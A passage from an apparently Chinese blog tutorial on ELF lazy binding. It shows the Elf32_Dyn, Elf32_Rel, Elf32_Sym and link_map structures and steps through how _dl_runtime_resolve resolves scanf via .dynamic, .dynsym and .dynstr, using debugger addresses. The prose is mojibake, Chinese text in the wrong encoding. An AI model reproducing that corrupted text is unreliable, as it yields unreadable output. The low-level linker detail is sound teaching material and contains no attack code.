ç­‰æ®µ)ã€‚</strong>ä¸‹é¢æ˜¯Elf32_Dynçš„ç»“æ„ï¼Œå®ƒç”±ä¸€ä¸ªç±»å‹å€¼å³d_tagå’Œä¸€ä¸ªæ•°å€¼æˆ–æŒ‡é’ˆï¼ˆunionæ˜¯ä¸€ä¸ªè”åˆä½“ï¼ŒåŒæ—¶å®šä¹‰äº†ä¸€ä¸ªæ•°å€¼d_valå’Œä¸€ä¸ªæŒ‡é’ˆd_ptrï¼Œä½†æ˜¯ä¸€æ¬¡åªèƒ½å­˜å‚¨ä¸€ä¸ªå€¼ï¼Œå› æ­¤è¿™ä¸ªè”åˆä½“çš„å¤§å°ä¸º4å­—èŠ‚ï¼Œè€Œæ•´ä¸ªç»“æ„ä½“Elf32_Dynä¸º8å­—èŠ‚ï¼Œè¿™ä¸ªç»“æ„ä»¥åŠç»“æ„çš„å¤§å°ä¼šåœ¨ä¸€ä¼šæŸ¥çœ‹Dynamic Symbols Tableå’ŒDynamic String Tableçš„æ—¶å€™æ´¾ä¸Šç”¨åœºï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword  d_tag;       <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;          <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;          <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><h3 id="åŠ¨æ€ç¬¦å·è¡¨ï¼ˆDynamic-Symbol-Table"><a href="#åŠ¨æ€ç¬¦å·è¡¨ï¼ˆDynamic-Symbol-Table" class="headerlink" title="åŠ¨æ€ç¬¦å·è¡¨ï¼ˆDynamic Symbol Table)"></a>åŠ¨æ€ç¬¦å·è¡¨ï¼ˆDynamic Symbol Table)</h3><p>åŠ¨æ€ç¬¦å·è¡¨ä¸­å­˜å‚¨äº†ä¸åŠ¨æ€é“¾æ¥ç›¸å…³çš„ç¬¦å·ï¼Œè€Œè¿™ä¸ªæ®µçš„æ®µåé€šå¸¸å«åšâ€œ.dynsymâ€ï¼Œè€Œå¯¹äºæœ¬æ¨¡å—çš„å†…éƒ¨ç¬¦å·æˆ–è€…ç§æœ‰å˜é‡åˆ™ä¿å­˜åœ¨.symtabè¿™ä¸ªè¡¨ï¼Œsymtabä¿å­˜äº†æ‰€æœ‰çš„ç¬¦å·ï¼ŒåŒ…æ‹¬.dynsymä¸­çš„ç¬¦å·ã€‚</p><p>ä½¿ç”¨readelf -s æ–‡ä»¶å  åˆ™å¯ä»¥æŸ¥çœ‹æ–‡ä»¶ä¸­çš„.dynsymå’Œsymtabï¼ˆå¦‚ä¸‹é¢ä¸¤å¼ å›¾ç‰‡ï¼‰</p><p><img src="/../img/2706180-20220228094602392-459952878.png"></p><p><img src="/../img/2706180-20220228094611847-731147180.png"></p><h3 id="åŠ¨æ€ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼ˆDynamic-String-Table"><a href="#åŠ¨æ€ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼ˆDynamic-String-Table" class="headerlink" title="åŠ¨æ€ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼ˆDynamic String Table)"></a>åŠ¨æ€ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼ˆDynamic String Table)</h3><p>è·Ÿåå­—ä¸€æ ·ï¼Œè¿™ä¸ªè¡¨å°±æ˜¯ä¿å­˜äº†ç¬¦å·åçš„å­—ç¬¦ä¸²è¡¨ã€‚è€Œè¿™ä¸ªè¡¨å­˜åœ¨çš„æ„ä¹‰æ˜¯ç”±äºDynamic Symbol Tableé‡Œè®°å½•çš„éƒ½æ˜¯å›ºå®šé•¿åº¦çš„å†…å®¹ï¼Œå› æ­¤å®ƒä»¬æ²¡åŠæ³•å»æè¿°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„ä»»æ„å­—ç¬¦ä¸²ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„å‡½æ•°åç§°ï¼‰ï¼Œå› æ­¤å°±éœ€è¦å†åˆ›ç«‹ä¸€ä¸ªè¡¨ï¼ˆä¹Ÿå°±æ˜¯.dynstr)æ¥å­˜å‚¨å‡½æ•°åç§°çš„å­—ç¬¦ä¸²ï¼Œåœ¨.dynsymä¸­çš„.st_nameå­—æ®µå­˜å‚¨äº†ä¸€ä¸ªåç§»ï¼Œè€Œæœ€å.dynstræ®µçš„é¦–åœ°å€åŠ ä¸Šè¿™ä¸ªåç§»é‡æ‰èƒ½æ‰¾åˆ°ç¬¦å·çš„åç§°ã€‚è€Œ_dl_lookupå‡½æ•°æœ€åå°±æ˜¯æ‹¿ç€è¿™ä¸ªç¬¦å·çš„åç§°ï¼ˆä¹Ÿå°±æ˜¯å‡½æ•°çš„åç§°ï¼‰å»åŠ¨æ€é“¾æ¥åº“é‡Œé¢æœç´¢å¯¹åº”çš„å‡½æ•°ã€‚</p><p>åœ¨IDAä¸­å¯ä»¥æ‰¾åˆ°è¿™ä¸ªELF String Table</p><p><img src="/../img/2706180-20220228094622567-442690588.png"></p><h2 id="dl-runtime-resolveå‡½æ•°å…·ä½“è¿è¡Œæ¨¡å¼"><a href="#dl-runtime-resolveå‡½æ•°å…·ä½“è¿è¡Œæ¨¡å¼" class="headerlink" title="_dl_runtime_resolveå‡½æ•°å…·ä½“è¿è¡Œæ¨¡å¼"></a>_dl_runtime_resolveå‡½æ•°å…·ä½“è¿è¡Œæ¨¡å¼</h2><ol><li><p>é¦–å…ˆç”¨<code>link_map</code>ï¼ˆå°±æ˜¯_dl_runtime_resolvehandçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼‰è®¿é—®<code>.dynamic</code>ï¼Œåˆ†åˆ«å–å‡º<code>.dynstr</code>ã€<code>.dynsym</code>ã€<code>.rel.plt</code>çš„åœ°å€</p></li><li><p><code>.rel.plt</code>+å‚æ•°<code>relic_index</code>ï¼Œæ±‚å‡ºå½“å‰å‡½æ•°çš„é‡å®šä½è¡¨é¡¹<code>Elf32_Rel</code>çš„æŒ‡é’ˆï¼Œè®°ä½œ<code>rel</code></p></li><li><p><code>rel-&gt;r_info</code> &gt;&gt; <code>8</code> ä½œä¸º<code>.dynsym</code>çš„ä¸‹æ ‡ï¼Œæ±‚å‡ºå½“å‰å‡½æ•°çš„ç¬¦å·è¡¨é¡¹<code>Elf32_Sym</code>çš„æŒ‡é’ˆï¼Œè®°ä½œ<code>sym</code></p></li><li><p><code>.dynstr</code> + <code>sym-&gt;st_name</code>å¾—å‡ºç¬¦å·å å­—ç¬¦ä¸²æŒ‡é’ˆ</p></li><li><p>åœ¨åŠ¨æ€é“¾æ¥åº“æŸ¥æ‰¾è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”æŠŠåœ°å€èµ‹å€¼ç»™<code>*rel-&gt;r_offset</code>ï¼Œå³<code>GOT</code>è¡¨</p></li><li><p>æœ€åè°ƒç”¨è¿™ä¸ªå‡½æ•°</p></li></ol><p>è¿™é‡Œæˆ‘ä»¥scanfå‡½æ•°çš„è°ƒç”¨æ¥æ¼”ç¤ºä¸€ä¸‹ï¼ˆéšä¾¿æ‰¾ä¸ªç¨‹åºå°±å¯ä»¥ä¸€èµ·åšäº†ï¼‰</p><p>æ­¤æ—¶å³å°†è°ƒç”¨scanfï¼Œæˆ‘ä»¬è¿›å…¥å†…éƒ¨çœ‹ä¸€ä¸‹</p><p><img src="/../img/2706180-20220228094633543-1760861108.png"></p><p>å‘ç°åˆšè¿›å»ï¼Œå°±è¦è®©è·³åˆ°0x0804a028æ‰€æŒ‡å‘çš„åœ°å€ï¼ˆæ³¨æ„è¿™é‡Œå¹¶ä¸æ˜¯è·³åˆ°0x0804a028ï¼Œè€Œæ˜¯è·³åˆ°0x0804a028æ‰€æŒ‡å‘çš„åœ°å€ï¼‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹0x0804a028æŒ‡å‘çš„å“ª</p><p><img src="/../img/2706180-20220228094641752-2061093355.png"></p><p>å‘ç°æŒ‡å‘çš„å°±æ˜¯ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œè¿™ä¹Ÿå°±é¡ºåº”äº†å»¶è¿Ÿç»‘å®šçš„æµç¨‹å›¾ä¸­çš„æ­¥éª¤â‘¡</p><p><img src="/../img/2706180-20220228094649241-866430968.png"></p><p>ä¹Ÿå¯ä»¥å‘ç°æ­¤æ—¶çš„gotè¡¨ä¸­scanfçš„åœ°å€å†™çš„å°±æ˜¯0x080484b6ï¼Œè€Œè¿™å¹¶ä¸æ˜¯scanfå‡½æ•°çš„çœŸå®åœ°å€ã€‚<br><img src="/../img/2706180-20220228094656078-12744920.png"></p><p>ç„¶åå‘ç°pushäº†ä¸€ä¸ª0x38ï¼Œæ­¤æ—¶æˆ‘ä»¬è¿˜ä¸çŸ¥é“è¿™æ˜¯ä»€ä¹ˆï¼Œå…ˆä¸ç®¡å®ƒã€‚</p><p>å‘ç°æ­¤æ—¶å‡†å¤‡è·³è½¬åˆ°åœ°å€0x8048430ï¼Œç„¶åè·³åˆ°0x08048430ï¼Œ<strong>å…¶å®æ­¤æ—¶ä½ ä¼šæ³¨æ„åˆ°è¿™ä¸ªåœ°å€è·ç¦»å½“å‰æŒ‡ä»¤çš„åœ°å€æ˜¯å¾ˆè¿‘çš„ï¼ˆå†çœ‹ä¸‹å»¶è¿Ÿç»‘å®šçš„æµç¨‹å›¾ä¼šå‘ç°å…¶å®ç°åœ¨å°±æ˜¯æ­¥éª¤â‘£ï¼‰</strong>ï¼Œç„¶åæ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªpushï¼Œä¸€ä¸ªjmpï¼Œæˆ‘ä»¬åˆ†åˆ«çœ‹ä¸‹pushå’Œjmpçš„å†…å®¹</p><p><img src="/../img/2706180-20220228094703865-691204009.png"></p><p>å¯ä»¥å‘ç°pushçš„æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè€Œjmpåˆ™æ˜¯è·³åˆ°äº†_dl_runtime_resolveï¼ˆæ­¤æ—¶å®Œæˆçš„æ˜¯å»¶è¿Ÿç»‘å®šæµç¨‹å›¾çš„æ­¥éª¤â‘¥ï¼‰</p><p><img src="/../img/2706180-20220228094710868-1046942444.png"></p><p><img src="/../img/2706180-20220228094718808-1062991369.png"></p><p>æ­¤æ—¶æ‰å‘ç°ï¼Œå‡†å¤‡è·³åˆ°_dl_runtime_resolveçš„æ—¶å€™ï¼Œä¹‹å‰å‹æ ˆçš„ä¸¤ä¸ªåŸæ¥æ˜¯å‚æ•°ï¼Œå› æ­¤æ ˆé¡¶çš„è¿™ä¸ªåœ°å€0xf7ffd940å°±æ˜¯å‚æ•°link_mapï¼Œè€Œ0x38åˆ™æ˜¯å‚æ•°reloc_indexã€‚</p><p><img src="/../img/2706180-20220228094727908-1299586145.png"></p><p>å› æ­¤æˆ‘ä»¬å…ˆé€šè¿‡link_mapå»æ‰¾åˆ°.dynamicçš„åœ°å€ï¼Œè¿™é‡Œç¬¬ä¸‰ä¸ªåœ°å€å°±æ˜¯.dynamicçš„åœ°å€ï¼Œä¸è¿‡ä¸ºä»€ä¹ˆæ˜¯ç¬¬ä¸‰ä¸ªåœ°å€ï¼Œè€Œä¸èƒ½æ˜¯åˆ«çš„åœ°å€ï¼Ÿï¼ˆå‚è€ƒä¸‹é¢çš„è§£é‡Šï¼Œæ€ä¹ˆç”¨æ€ä¹ˆç”¨link_mapè®¿é—®åˆ°.dynamicçš„åœ°å€çš„ï¼Ÿï¼‰<br><img src="/../img/2706180-20220228094734973-1296358547.png"></p><h3 id="æ€ä¹ˆç”¨link-mapè®¿é—®åˆ°-dynamicçš„åœ°å€çš„ï¼Ÿ"><a href="#æ€ä¹ˆç”¨link-mapè®¿é—®åˆ°-dynamicçš„åœ°å€çš„ï¼Ÿ" class="headerlink" title="æ€ä¹ˆç”¨link_mapè®¿é—®åˆ°.dynamicçš„åœ°å€çš„ï¼Ÿ"></a>æ€ä¹ˆç”¨link_mapè®¿é—®åˆ°.dynamicçš„åœ°å€çš„ï¼Ÿ</h3><p>link_mapçš„æºç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;    <span class="comment">/* Base address shared object is loaded at.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;     <span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;      <span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°åœ¨ç¬¬ä¸‰ä¸ªæˆå‘˜ *l_ldè¿™é‡Œå­˜å‚¨çš„æ˜¯Dynamicæ®µåœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å»æŸ¥æ‰¾link_mapç»“æ„ä½“ä¸­ç¬¬ä¸‰ä¸ªçš„åœ°å€å°±æ˜¯.dynamicçš„åœ°å€äº†</p><p>ç°åœ¨è¦åˆ†åˆ«å–å‡º<code>.dynstr</code>ã€<code>.dynsym</code>ã€<code>.rel.plt</code>çš„åœ°å€äº†ï¼Œå®ƒä»¬å¤„äºä»€ä¹ˆä½ç½®ï¼Ÿ</p><p>æˆ‘ä»¬å…ˆç”¨readelf -d çœ‹ä¸€ä¸‹.dynamicæ®µçš„å†…å®¹</p><p><img src="/../img/2706180-20220228094743012-658911024.png"></p><p><strong>å‘ç°äº†.dynstrã€.dynsymå’Œrel.pltçš„ä½ç½®ï¼Œåˆ†åˆ«æ˜¯ä½äºäº†åç§»9ï¼Œåç§»10ï¼Œå’Œåç§»17çš„ä½ç½®ï¼Œåˆç»“åˆæœ€å‰é¢æåˆ°çš„ç»“æ„ä½“Elf32_Dynä¸º8å­—èŠ‚ï¼Œå¹¶ä¸”å®é™…çš„å€¼æˆ–è€…æŒ‡é’ˆåº”è¯¥å¤„äºåå››å­—èŠ‚ï¼Œå› æ­¤ä»–ä»¬åº”è¯¥åˆ†åˆ«åœ¨dynamicæ®µä¸­ä½äº8*9-4&#x3D;0x44ï¼Œ10*8-4&#x3D;0x4c,17*8-4&#x3D;0x84åç§»å¤„</strong>ï¼ˆè¿™é‡Œè¦å‡å»4å­—èŠ‚æ˜¯å› ä¸ºæˆ‘è®¡ç®—çš„æ˜¯ä¸åŒ…æ‹¬ä»–ä»¬èº«å¤„å½“å‰ä½ç½®çš„å­—èŠ‚ï¼Œè€Œå‰é¢è®¡ç®—åç§»9ã€10ã€17çš„æ—¶å€™ï¼ŒåŒ…æ‹¬äº†ä»–ä»¬èº«å¤„å½“å‰ä½ç½®çš„åç§»ï¼‰å› æ­¤è¿™é‡Œå»çœ‹ä¸‹.dynamicæ®µçš„å†…å®¹ï¼Œç„¶åå–å‡ºå¯¹åº”åç§»çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„.dynstrã€dynsymã€rel.pltã€‚</p><p><img src="/../img/2706180-20220228094750474-266299948.png"></p><p>ç„¶åç”¨rel.pltçš„å€¼åŠ ä¸Šå‚æ•°reloc_indexï¼Œå°±æ˜¯é‡å®šä½è¡¨é¡¹Elf32_Relçš„æŒ‡é’ˆï¼Œå³0x080483c4+0x38&#x3D;0x80483fcã€‚</p><p><img src="/../img/2706180-20220228094758713-328537999.png"></p><p>ä¸‹é¢æ˜¯Elf32_Relçš„ç»“æ„ï¼Œå¯¹åº”ä¸Šå›¾æ¥çœ‹ï¼Œå› æ­¤r_offset&#x3D;0x804A028<strong>ï¼ˆè€Œè¿™ä¸ªr_offsetå°±æ˜¯got.pltçš„åœ°å€ï¼Œ<font color=red>å°±æ˜¯è¯´æœ€åè§£æä¹‹åçœŸå®çš„åœ°å€ä¼šå¡«å†™è¿›r_offsetæ‰€æŒ‡å‘çš„åœ°æ–¹ï¼‰</font></strong>,r_info&#x3D;0x907ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr   r_offset;     <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word   r_info;          <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p>è€Œå°†r_info&gt;&gt;8ä½œä¸ºdynsymçš„ä¸‹æ ‡ï¼Œå³0x907&gt;&gt;8&#x3D;9</p><p><img src="/../img/2706180-20220228094808547-1115623759.png"></p><p>æ­¤æ—¶å®ƒçš„åœ°å€ä¸º0x08048268ï¼Œæˆ‘ä»¬çœ‹ä¸‹Elf32_Symçš„æºç ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p>å‘ç°åœ¨ç¬¬ä¸€ä¸ªæˆå‘˜st_nameå­˜å‚¨çš„å°±æ˜¯å­—ç¬¦ä¸²è¡¨çš„ç´¢å¼•ï¼ˆè¿™é‡Œæˆ‘æ„Ÿè§‰ç†è§£æˆåç§»æ›´åˆé€‚ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¦å·è¡¨çš„ä¸€ä¸ªå†…å®¹å­˜å‚¨çš„å°±æ˜¯.dynstrè·ç¦»æ‰€éœ€è¦å‡½æ•°åç§°çš„åç§»ã€‚</p><p>é‚£æˆ‘ä»¬çœ‹ä¸€ä¸‹0x08048268åœ°å€çš„å†…å®¹ï¼Œå‘ç°äº†åç§»æ˜¯0x1a<br><img src="/../img/2706180-20220228094819076-1553870020.png"></p><p>å› æ­¤æœ€ç»ˆçš„st_nameçš„åœ°å€ä¸º.dynstrçš„åœ°å€åŠ ä¸Šä¹‹å‰æ‹¿åˆ°çš„.dynstrçš„ç´¢å¼•ï¼Œå³0x080482a8+0x1a&#x3D;0x080482c2,</p><p>æœ€ç»ˆä¹Ÿæ˜¯æˆåŠŸæ‰¾åˆ°.dynsträ¸­çš„scanfå‡½æ•°åå­—çš„å­˜å‚¨åœ°å€ã€‚<br><img src="/../img/2706180-20220228094826126-1150418789.png"></p><p>æ¥ä¸‹æ¥å°±ä¼šè°ƒç”¨_dl_lookup_symbol_xå‡½æ•°ï¼Œå»åŠ¨æ€åº“é‡Œè¿›è¡Œéå†æœç´¢ï¼Œå¯ä»¥çœ‹è§ä¸‹å›¾çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬è¦æœç´¢çš„å‡½æ•°åç§°</p><p><img src="/../img/2706180-20220228094834270-1905443385.png"></p><h2 id="å€’æ¨æ•´ä¸ªè¿‡ç¨‹ï¼Œå¢å¼ºæ•´ä½“çš„é€»è¾‘æ€§"><a href="#å€’æ¨æ•´ä¸ªè¿‡ç¨‹ï¼Œå¢å¼ºæ•´ä½“çš„é€»è¾‘æ€§" class="headerlink" title="å€’æ¨æ•´ä¸ªè¿‡ç¨‹ï¼Œå¢å¼ºæ•´ä½“çš„é€»è¾‘æ€§"></a>å€’æ¨æ•´ä¸ªè¿‡ç¨‹ï¼Œå¢å¼ºæ•´ä½“çš„é€»è¾‘æ€§</h2><p>ç„¶åä¸Šé¢è¯´æ˜çš„æ˜¯å…·ä½“çš„å®ç°è¿‡ç¨‹ï¼Œä½†æ˜¯å½¼æ­¤å› æœæ€§å¯èƒ½ä¸æ˜¯ç‰¹åˆ«å¼ºï¼Œä¸‹é¢æˆ‘å†å€’æ¨ä¸€éï¼Œç›®çš„æ˜¯ä¸ºäº†è®©ä½ çŸ¥é“æ¯ä¸€æ­¥éƒ½åœ¨å¹²ä»€ä¹ˆã€‚</p><p><strong>æˆ‘ä»¬éœ€è¦æ‹¿åˆ°æˆ‘ä»¬è¦æ‰¾çš„å‡½æ•°åå­—ï¼ˆå®ƒæ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œæˆ‘ä»¬è¦æ‹¿åˆ°è¿™ä¸ªå­—ç¬¦ä¸²çš„é¦–åœ°å€ï¼‰ï¼Œç„¶åæŠŠå®ƒäº¤ç»™_dl_lookup_symbol_x,è®©è¿™ä¸ªå‡½æ•°å»åŠ¨æ€åº“é‡Œé¢æœç´¢ï¼Œæ‰¾åˆ°æˆ‘ä»¬æƒ³å»¶è¿Ÿç»‘å®šçš„å‡½æ•°ï¼Œç„¶åæŠŠåœ°å€å†å¡«å†™åˆ°got.plté‡Œé¢</strong></p><p>é‚£ç°åœ¨å”¯ä¸€çš„é—®é¢˜å°±æ˜¯æˆ‘ä»¬æ€ä¹ˆæ‹¿åˆ°è¿™ä¸ªå‡½æ•°çš„åå­—çš„å­—ç¬¦ä¸²ï¼Ÿ<br><strong>è¿™ä¸ªå­—ç¬¦ä¸²æ”¾åœ¨.dynstrï¼ˆåŠ¨æ€ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼‰äº†é‡Œé¢ï¼Œé‚£æˆ‘ä»¬ç°åœ¨éœ€è¦ä¸¤ä¸ªä¸œè¥¿ï¼Œ<font color=red>ä¸€ä¸ªæ˜¯.dynstrçš„é¦–åœ°å€ï¼Œä¸€ä¸ªæ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„å­—ç¬¦ä¸²è·ç¦».dynstré¦–åœ°å€çš„åç§»</font>ï¼Œæ‰èƒ½å‡†ç¡®çš„å»æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„å‡½æ•°åå­—</strong></p><p>é‚£ç°åœ¨çš„é—®é¢˜å°±æ˜¯è¿™ä¸¤ä¸ªä¸œè¥¿æ€ä¹ˆæ‰¾ï¼Ÿ</p><h3 id="â‘ å…ˆè¯´-dynstrçš„é¦–åœ°å€"><a href="#â‘ å…ˆè¯´-dynstrçš„é¦–åœ°å€" class="headerlink" title="â‘ å…ˆè¯´.dynstrçš„é¦–åœ°å€"></a><strong>â‘ å…ˆè¯´.dynstrçš„é¦–åœ°å€</strong></h3><p><strong>åœ¨.dynamicæ®µé‡Œå­˜å‚¨äº†åŠ¨æ€é“¾æ¥å™¨æ‰€éœ€è¦çš„åŸºæœ¬ä¿¡æ¯ï¼Œè€Œè¿™å…¶ä¸­å°±åŒ…å«äº†.dynstrçš„ä½ç½®</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœç°åœ¨æ‰¾åˆ°äº†.dynamicçš„åœ°å€ï¼ŒæŸ¥çœ‹é‡Œé¢çš„å†…å®¹å³å¯æ‰¾åˆ°.dynstrçš„ä½ç½®<br>é‚£ç°åœ¨çš„é—®é¢˜å°±æ˜¯å»æ‰¾.dynamicçš„åœ°å€ã€‚<br>è€Œè§‚å¯Ÿäº†link_mapçš„ç»“æ„ï¼Œ<strong>å‘ç°link_mapç»“æ„ä½“ä¸­ç¬¬ä¸‰ä¸ªå†…å®¹å­˜æ”¾çš„å°±æ˜¯.dynamicçš„åœ°å€</strong><br>å› æ­¤æˆ‘ä»¬åªéœ€è¦å»æŸ¥çœ‹ä¸€ä¸‹link_mapçš„å†…å®¹ï¼Œç„¶åç¬¬ä¸‰ä¸ªå†…å®¹å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„ä¸œè¥¿äº†ï¼Œ<strong>è€Œlink_mapæˆ‘ä»¬æ˜¯çŸ¥é“çš„ï¼Œå› ä¸ºå®ƒå°±æ˜¯æ‰§è¡Œ_dl_runtime_resolveå‡½æ•°æ—¶çš„ç¬¬ä¸€ä¸ªå‚æ•°link_map_objã€‚</strong><br>å¦‚æ­¤å†æ¨å›å»ï¼Œå°±å¯ä»¥çŸ¥é“.dynstrçš„åœ°å€äº†</p><h3 id="â‘¡å†è¯´ä¸€ä¸‹ç›¸å¯¹äº-dynstré¦–åœ°å€çš„åç§»æ€ä¹ˆæ‰¾"><a href="#â‘¡å†è¯´ä¸€ä¸‹ç›¸å¯¹äº-dynstré¦–åœ°å€çš„åç§»æ€ä¹ˆæ‰¾" class="headerlink" title="â‘¡å†è¯´ä¸€ä¸‹ç›¸å¯¹äº.dynstré¦–åœ°å€çš„åç§»æ€ä¹ˆæ‰¾"></a><strong>â‘¡å†è¯´ä¸€ä¸‹ç›¸å¯¹äº.dynstré¦–åœ°å€çš„åç§»æ€ä¹ˆæ‰¾</strong></h3><p>é€šè¿‡é˜…è¯»<strong>Elf32_Sym</strong>çš„æºç ï¼Œå‘ç°<strong>å®ƒè¿™ä¸ªç»“æ„ä½“ä¸­ç¬¬ä¸€ä¸ªæˆå‘˜å­˜å‚¨çš„å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„åç§»</strong><br>è€Œ<strong>è¿™ä¸ªç»“æ„åˆå­˜å‚¨åœ¨.dynsymï¼ˆåŠ¨æ€ç¬¦å·è¡¨ï¼‰ä¸­</strong>ï¼ˆæ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ªè‡ªå·±å•ç‹¬çš„Elf32_Symç»“æ„ï¼‰<br>å› æ­¤<strong>æˆ‘ä»¬å¯ä»¥åœ¨.dynsymä¸­æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„Elf32_Symç»“æ„</strong>ï¼Œå¯æ˜¯åˆå‡ºç°äº†ä¸¤ä¸ªé—®é¢˜ã€‚<br><strong><font color=red>æ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ªè¿™ä¸ªç»“æ„ï¼Œé‚£æˆ‘ä»¬æ€ä¹ˆå».dynsymä¸­æ‰¾åˆ°æˆ‘ä»¬è¦æ‰¾çš„è¿™ä¸ªå‡½æ•°çš„ç»“æ„ï¼Ÿå¹¶ä¸”.dynsymçš„åœ°å€æ€ä¹ˆæ‰¾ï¼Ÿ</font></strong></p><h4 id="å…ˆè§£å†³ç¬¬äºŒä¸ªé—®é¢˜"><a href="#å…ˆè§£å†³ç¬¬äºŒä¸ªé—®é¢˜" class="headerlink" title="å…ˆè§£å†³ç¬¬äºŒä¸ªé—®é¢˜"></a>å…ˆè§£å†³ç¬¬äºŒä¸ªé—®é¢˜</h4><p><strong>.dynsymçš„åœ°å€ä¹Ÿåœ¨ä¸Šé¢æåˆ°çš„.dynamicæ®µä¸­å­˜å‚¨äº†</strong>ï¼Œè€Œä¸Šé¢æˆ‘ä»¬å·²ç»è¯´äº†æ€ä¹ˆæ‰¾.dynamicæ®µçš„åœ°å€ï¼Œå› æ­¤è¿™ä¸ª.dynsymçš„åœ°å€å·²ç»è¢«æˆ‘ä»¬çŸ¥é“äº†</p><h4 id="ç„¶åè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ€ä¹ˆåœ¨-dynsymä¸­æ‰¾åˆ°æˆ‘ä»¬è¦æ‰¾çš„é‚£ä¸ªå‡½æ•°çš„ç»“æ„ï¼Ÿ"><a href="#ç„¶åè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ€ä¹ˆåœ¨-dynsymä¸­æ‰¾åˆ°æˆ‘ä»¬è¦æ‰¾çš„é‚£ä¸ªå‡½æ•°çš„ç»“æ„ï¼Ÿ" class="headerlink" 